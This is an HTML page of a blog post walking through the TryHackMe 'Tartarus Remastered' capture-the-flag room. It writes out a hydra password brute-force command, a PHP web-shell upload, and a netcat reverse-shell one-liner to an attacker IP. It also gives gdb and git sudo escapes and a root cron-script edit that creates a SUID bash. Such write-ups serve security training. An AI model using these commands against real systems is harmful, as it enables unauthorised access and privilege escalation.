<!DOCTYPE html>
<html lang="en-us">
<head>
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <title>Tzero86@trojanwave/posts/tartarus_writeup/</title>
    
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <meta name="robots" content="all,follow">
    <meta name="googlebot" content="index,follow,snippet,archive">
    <link rel="stylesheet" href="https://tzero86bits.tk/hugo-theme-console/css/terminal-0.7.1.min.css">
    <link rel="stylesheet" href="https://tzero86bits.tk/hugo-theme-console/css/animate-3.7.2.min.css">
    <link rel="stylesheet" href="https://tzero86bits.tk/hugo-theme-console/css/console.css">
    
      <!--[if lt IE 9]>
          <script src="https://oss.maxcdn.com/html5shiv/3.7.2/html5shiv.min.js"></script>
          <script src="https://oss.maxcdn.com/respond/1.4.2/respond.min.js"></script>
      <![endif]-->
    <link rel="icon" href="https://tzero86bits.tk/favicon.ico">
<link rel="icon" type="image/png" sizes="16x16" href="https://tzero86bits.tk/favicon-16x16.png">
<link rel="icon" type="image/png" sizes="32x32" href="https://tzero86bits.tk/favicon-32x32.png">
<link rel="apple-touch-icon" href="https://tzero86bits.tk/apple-touch-icon.png">
<link rel="mask-icon" href="https://tzero86bits.tk/safari-pinned-tab.svg">
<meta name="theme-color" content="#1d1e20">
<meta name="msapplication-TileColor" content="#1d1e20"><meta property="og:title" content="Tartarus_writeup" />
<meta property="og:description" content="" />
<meta property="og:type" content="article" />
<meta property="og:url" content="https://tzero86bits.tk/posts/tartarus_writeup/" /><meta property="article:published_time" content="2020-10-28T10:10:38-04:00" />



<meta name="twitter:title" content="Tartarus_writeup"/>
<meta name="twitter:description" content="Welcome to another writeup, this time we hack Tartarus-Remastered another TryHackMe room. Let&rsquo;s see if we get root during the lunch break at work XD"/>

<script type="application/javascript">
var doNotTrack = false;
if (!doNotTrack) {
	(function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
	(i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
	m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
	})(window,document,'script','https://www.google-analytics.com/analytics.js','ga');
	ga('create', 'UA-175520987-1', 'auto');
	
	ga('send', 'pageview');
}
</script>
</head>
<body class="terminal">
    <div class="container">
        <div class="terminal-nav">
          <header class="terminal-logo">
            <div class="logo terminal-prompt">
              
              
              <a href="https://tzero86bits.tk/" class="no-style site-name">Tzero86@trojanwave</a>:~# 
              <a href='https://tzero86bits.tk/posts'>posts</a>/<a href='https://tzero86bits.tk/posts/tartarus_writeup'>tartarus_writeup</a>/</div></header>
          <nav class="terminal-menu">
            <ul vocab="https://schema.org/" typeof="BreadcrumbList">
                
                <li><a href="https://tzero86bits.tk/about/" typeof="ListItem">about/</a></li>
                
                <li><a href="https://tzero86bits.tk/posts/" typeof="ListItem">posts/</a></li>
                
            </ul>
          </nav>
        </div>
    </div>

    <div class="container animated zoomIn fast" >
        
<h1>Tartarus_writeup</h1>
Oct. 28, 2020


<br/><br/>
<img src="../img/tartarus_cover.gif" alt="Post Cover Gif animation"; style="width:100%;height:auto;left:0;right:0;margin:0 auto;text-align:center; border-radius:1%">
<br/><br/>
<h1 id="tartarus-remastered-tryhackme-room">Tartarus-Remastered TryHackMe Room</h1>
<p>Welcome back! Today I have another writeup. This time I went for a just-released room on TryHackMe called <code>Tartarus Remastered</code>. I hope you enjoy it!</p>
<ul>
<li>Please visit This room on TryHackMe by <a href="https://tryhackme.com/room/gamingserver">clicking this link</a>.</li>
<li><strong>PLEASE NOTE:</strong> Passwords, flag values, or any kind of answers to the room questions were intentionally masked as required by THM writeups rules.</li>
</ul>
<h2 id="getting-started">Getting Started</h2>
<p>I&rsquo;ll be using once again <code>autorecon &lt;IP&gt;</code> to scan this box. So leave that running or perform manual scans if you&rsquo;d like. I&rsquo;m going through this room on my lunch break at work so don&rsquo;t have much time XD.</p>
<h2 id="checking-autorecon-results-and-gaining-access">Checking Autorecon Results and gaining access.</h2>
<p>If we look at Gobuster&rsquo;s results, we see a <code>robots.txt</code> file that we can access:</p>
<p><img src="https://i.imgur.com/8tlOnnV.png" alt=""></p>
<p>If we look at that directory in <code>disallowed</code> entry:</p>
<p><img src="https://i.imgur.com/k8M3EWs.png" alt=""></p>
<p>If we look at the FTP (nmap scan shows anonymous login is enabled), we can see something interesting:</p>
<p><img src="https://i.imgur.com/yMT7CDr.png" alt=""></p>
<p>There are directories named <code>...</code> that we can access and inside there is a file.</p>
<p>If we check that file we see another directory is mentioned:</p>
<p><img src="https://i.imgur.com/aD9j2RN.png" alt=""></p>
<p>We get a login form. This is getting quite familiar, we can try the same we did for the room called <code>Hydra</code>. Check that <a href="https://www.tzero86bits.tk/posts/hydra_writeup/">here</a>.</p>
<p>We need to construct a POST request attack with hydra.</p>
<p>/sUp3r-s3cr3t</p>
<p><code>hydra -l userid -P credentials.txt 10.10.61.206 http-post-form &quot;/sUp3r-s3cr3t/authenticate.php:username=^USER^&amp;password=^PASS^:F=Incorrect&quot; -V -F -u</code></p>
<p><img src="https://i.imgur.com/eYR3wxO.png" alt=""></p>
<p>We can also let gobuster now we have a new directory that it can explore:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sh" data-lang="sh">gobuster dir --wordlist /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -u http://10.10.61.206/sUp3r-s3cr3t/ -x php,txt,html,sh,cgi
</code></pre></div><p><img src="https://i.imgur.com/guZOPm4.png" alt=""></p>
<p>If we brute-force the login request we get the following:</p>
<p><img src="https://i.imgur.com/DJnKg3T.png" alt=""></p>
<p>And if we login we get an upload form:</p>
<p><img src="https://i.imgur.com/HqND3cF.png" alt=""></p>
<p>We can try to upload a semi-interactive php-bash and see if we can access that:</p>
<p><img src="https://i.imgur.com/Ma8sKV5.png" alt=""></p>
<p>Now if we navigate back to that <code>images/uploads/</code> folder, we see our file is there:</p>
<p><img src="https://i.imgur.com/ukMGnE0.png" alt=""></p>
<p>If we go ahead and click on that file we get our PHP-Bash working:</p>
<p><img src="https://i.imgur.com/ytecqGV.png" alt=""></p>
<p>If we navigate to the home folder, we can access <code>d4rckh</code> folder and cat out the user flag:</p>
<p><img src="https://i.imgur.com/ia7SGaw.png" alt=""></p>
<p>Ok so now we need to go get the root flag. Even though the semi-interactive shell we got is fine. I would like to have better access from my own terminal so let&rsquo;s try to get a reverse shell.</p>
<p>We start a <code>nc -nlvp 2112</code> in our terminal and then we try to fire a connection in the php-bash file back to our machine:</p>
<p><code>rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 10.13.0.34 2112 &gt;/tmp/f</code></p>
<p>Now that we have a reverse shell, we can navigate a bit more comfortable. If we take a look at the other folder at the home directory we see another file that mentions <code>git</code>.</p>
<p><img src="https://i.imgur.com/vCfgrjw.png" alt=""></p>
<p>If we run a <code>sudo -l</code> we see that the user we have can run <code>gdb</code> as sudo. Let&rsquo;s check GTFObins to see if we have a way of exploiting that.</p>
<p>It seems there is a way to get a reverse shell, lets try that:</p>
<p><img src="https://i.imgur.com/Bxp6Jwb.png" alt=""></p>
<p>Maybe I&rsquo;m doing something wrong but <code>gdb</code> did not work and I still was <code>www-data</code> user after trying all the options listed on GTFbins. Let&rsquo;s check if we have any running cron jobs:</p>
<p><img src="https://i.imgur.com/mBQUZT2.png" alt=""></p>
<p>Indeed we have and, it is a file I saw inside <code>d4rckh</code>&rsquo;s folder. Since that cron job is running as root, we can try to edit it so when it runs it spaws a privileged shell back to us.</p>
<p>But first we really need to get gdb working so we can switch user. The idea here is to impersonate the other user <code>thirtytwo</code> and see what he can run as sudo, and if we recall the file we found earlier we know that <code>d4rckh</code> fixed the access to git for him. So we can assume <code>thirtytwo</code> could have privileged access to git executable.</p>
<p>After checking a while on that gdb binary, it seems we can try it as follows:</p>
<p><code>sudo -u thirtytwo /var/www/gdb -nx -ex '!sh' -ex qu</code></p>
<p>That seems to work and we are now the expected user which, as we thougth has access to git.</p>
<p><img src="https://i.imgur.com/whF3tz3.png" alt=""></p>
<p>Let&rsquo;s check back on GTFObins if we have anything on git to get root.</p>
<p>We can try to run <code>python -c 'import pty;pty.spawn(&quot;/bin/bash&quot;);'</code> to get a TTY shell before we try to get root.</p>
<p>NOTE: also run <code>export TERM=xterm</code> to get a more responsive terminal that for instance is able to <code>clear</code> the screen.</p>
<p>Now let&rsquo;s try some of the commands suggested by GTFObins. If we check the <code>Sudo</code> section we get a few to try. The first one does not work at all in this case. Let&rsquo;s check the second:</p>
<p><code>sudo git -p help config</code> and <code>!/bin/sh</code></p>
<p>Still we need to adjust the command a bit, we need to explicitly set the user we want to switch to:</p>
<p><code>sudo -u d4rckh git -p help config</code></p>
<p>That seems to work and we are now the user <code>d4rckh</code></p>
<p><img src="https://i.imgur.com/Vh8mDXQ.png" alt=""></p>
<p>Ok now let&rsquo;s check that <code>cleanup.py</code> file that&rsquo;s running as a cron job. And see if we can edit it to get us root.</p>
<blockquote>
<p>NOTE: To make sure I don&rsquo;t lose the original file, I ran <code>cp cleanup.py cleanup.py.bak</code></p>
</blockquote>
<p>Now let&rsquo;s see if we can edit the file with nano:</p>
<p>Even though we got an error before nano opens, we are able to edit the file. We make the changes to the command being executed so it creates a copy of <code>bash</code> with privileges that we can execute later in one of our accessible directories:</p>
<p><img src="https://i.imgur.com/sQ9FYjp.png" alt=""></p>
<p>We save the file and we just wait, since the file is tied to a cronjob we need to wait for it to get executed:</p>
<p>If you notice the command tells the system to copy bash into a <code>tmp/rootbash</code> folder.</p>
<blockquote>
<p>NOTE: Credits to @ratiros01 on that command, I was just failing at making that work until I came across his idea for that in one of his posts.</p>
</blockquote>
<p>Let&rsquo;s navigate to that temp folder and see if we get our bash copied. We do, it worked. Now we need to run that file, however we need to make use of the switch <code>-p</code> so the binary would not drop his privileges. Otherwise it would run with the permissions our current user has.</p>
<p><img src="https://i.imgur.com/LtTBQvp.png" alt=""></p>
<p>It worked great and we are now root!, let&rsquo;s grab that flag and complete the room.</p>
<p><img src="https://i.imgur.com/eXiuc6f.png" alt=""></p>
<p>I hope you enjoyed this room as much as I did, thanks again to @ratiros01 for his post that helped me when I got stuck.</p>
<p>Happy hacking and thanks for stopping by!</p>
<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css">
<br>
<div class="container center" style="margin:10px !important;  text-align: center!important">
    <div class="center">
        <script src="https://tryhackme.com/badge/71634"></script>
    </div>
    <div class="center">
        <a href="https://twitter.com/Tzero86" target="_blank" class="fa fa-twitter" style="text-decoration: none !important;  font-size: 30px; padding: 5px"></a>
        <a href="https://github.com/Tzero86" target="_blank" class="fa fa-github" style="text-decoration: none !important;  font-size: 30px; padding: 5px"></a> 
        <a href="https://www.linkedin.com/in/ermedina86/" target="_blank" class="fa fa-linkedin" style="text-decoration: none !important;  font-size: 30px; padding: 5px"></a> 
        <br> 
    </div>
</div>

<div id="disqus_thread"></div>
<script type="application/javascript">
    var disqus_config = function () {
    
    
    
    };
    (function() {
        if (["localhost", "127.0.0.1"].indexOf(window.location.hostname) != -1) {
            document.getElementById('disqus_thread').innerHTML = 'Disqus comments not available by default when the website is previewed locally.';
            return;
        }
        var d = document, s = d.createElement('script'); s.async = true;
        s.src = '//' + "tzero86bits" + '.disqus.com/embed.js';
        s.setAttribute('data-timestamp', +new Date());
        (d.head || d.body).appendChild(s);
    })();
</script>
<noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
<a href="https://disqus.com" class="dsq-brlink">comments powered by <span class="logo-disqus">Disqus</span></a>

        <div class="footer">
    Made with <a href="https://gohugo.io/">Hugo</a> based of
    <a href="https://github.com/mrmierzejewski/hugo-theme-console/">Console Theme</a>. 
    Noli umquam discere desinere.
</div>

    </div>
  </body>
</html>
